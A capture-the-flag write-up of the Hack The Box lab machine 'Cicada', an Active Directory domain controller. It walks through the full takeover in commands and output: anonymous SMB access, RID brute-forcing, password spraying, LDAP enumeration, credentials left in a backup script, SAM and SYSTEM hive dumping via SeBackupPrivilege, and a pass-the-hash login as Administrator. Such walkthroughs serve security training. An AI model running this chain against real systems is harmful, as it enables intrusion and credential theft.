# Cicada

<figure><img src="../../../.gitbook/assets/image (166).png" alt="" width="225"><figcaption></figcaption></figure>

## Port scan

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-29 10:41:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2024-09-29T10:41:58
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.14 seconds
           Raw packets sent: 15 (636B) | Rcvd: 12 (512B)
```

## User: Michael wrightson

### Smbclient

```bash
╰─➤  smbclient -L \\\\10.129.151.238\\     
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.151.238 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can download files from `HR` share,

```bash
╰─➤  smbclient -U ''  \\\\10.129.151.238\\HR                                                                                                                                                                                             130 ↵
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 17:59:09 2024
  ..                                  D        0  Thu Mar 14 17:51:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 23:01:48 2024

smb: \> get "Notice from HR.txt" 
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
```

### Contents (password)

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

We get default password: `Cicada$M6Corpb*@Lp#nZp!8`

### Crackmapexec: RID bruteforce

Lets find few users with cme,

```bash
cme smb 10.129.151.238  -u 'guest' -p '' --rid-brute
```

```bash
╰─➤  cat found.users | grep -i sidtypeuser                                                                                                                                                                                               130 ↵
SMB         10.129.151.238  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.151.238  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.151.238  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.151.238  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.151.238  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.151.238  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.151.238  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.151.238  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.151.238  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Lets try and see what user we can use with the password given,

```bash
for i in $(cat found.users| grep -i sidtypeuser | cut -d '\' -f 2 | cut -d ' ' -f1)
do
cme smb 10.129.151.238 -u $i -p 'Cicada$M6Corpb*@Lp#nZp!8'
done
SMB         10.129.151.238  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.238  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.151.238  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.238  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.151.238  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.238  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.151.238  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.238  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.151.238  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.238  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.151.238  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.238  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.151.238  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.238  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.151.238  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.238  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.151.238  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.151.238  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
```

Great, we found a successfull login,&#x20;

```
[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp
```

```bash
cme smb 10.129.151.238 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares 

[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
[+] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
DEV                             
HR              READ            
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
```

There was nothing interesting found here, as we don't have win-rm port open, we can't get shell through it, lets try some enumeration in LDAP

### Ldap enumeration

```bash
ldapsearch -x -H ldap://10.129.151.238 -D "CICADA\michael.wrightson" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb"
```



```bash
# David Orelious, Users, cicada.htb
dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb
<...SNIP...>

description: Just in case I forget my password is aRt$Lp#7t*VQ!3

<...SNIP...>
```

Great, new password, `aRt$Lp#7t*VQ!3`

## User: David Orelious&#x20;

We can try again with smbshares, \
We can see David have read acces on `DEV` share :)

```bash
cme smb 10.129.151.238 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
DEV             READ            
HR              READ            
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
```

```bash
╰─➤  smbclient -U 'david.orelious' //10.129.151.238/DEV -p 445                                                   
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 18:01:39 2024
  ..                                  D        0  Thu Mar 14 17:51:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 22:58:22 2024

		4168447 blocks of size 4096. 250141 blocks available
smb: \> get "Backup_script.ps1"
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```

#### Backup\_script.ps1

```powershell
╰─➤  cat Backup_script.ps1                                                

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

We find emilys' creds `Q!3@Lp#M6b*7t*Vt`

### Winrm&#x20;

User david doesn't have enough privileges for win-rm

```bash
╰─➤  cme winrm 10.129.151.238 -u david.orelious -p 'aRt$Lp#7t*VQ!3'
SMB         10.129.151.238  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
HTTP        10.129.151.238  5985   CICADA-DC        [*] http://10.129.151.238:5985/wsman
WINRM       10.129.151.238  5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```

## User: Emily Oscars

Now as we do have password for this, and we saw most stuff in smbshares, we can try for win-rm

```bash
╰─➤  cme winrm 10.129.151.238 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
[*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
[*] http://10.129.151.238:5985/wsman
[+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

Great, let's login now,

### Shell

```powershell
╰─➤  evil-winrm -i 10.129.151.238 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'                                                                                                                                                                  130 ↵
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 
```

## User: Administrator

### /priv

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We have `SeBackupPrivilege` set, that means, we can backup ANY file/dir on the system even if we dont have enough privileges to read it.

We want sam, system for getting shell,

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd C:\
*Evil-WinRM* PS C:\> mkdir Temp
*Evil-WinRM* PS C:\> reg save hklm\sam C:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system C:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\> cd Temp
```

```powershell
Evil-WinRM* PS C:\Temp> download sam    
Info: Downloading C:\Temp\sam to sam
Info: Download successful!

*Evil-WinRM* PS C:\Temp> download system                                        
Info: Downloading C:\Temp\system to system
Info: Download successful!
```

Reference:

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" %}

We can do credential/hash dumping, i've used `pypykatz` utility,&#x20;

```bash
╰─➤  pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Let's login with the hash,&#x20;

```powershell
╰─➤  evil-winrm -i 10.129.151.238 -u administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
```

Pwned!!

\_\_\_\_\_\_\_\_\_\_\_heapbytes' stil pwning
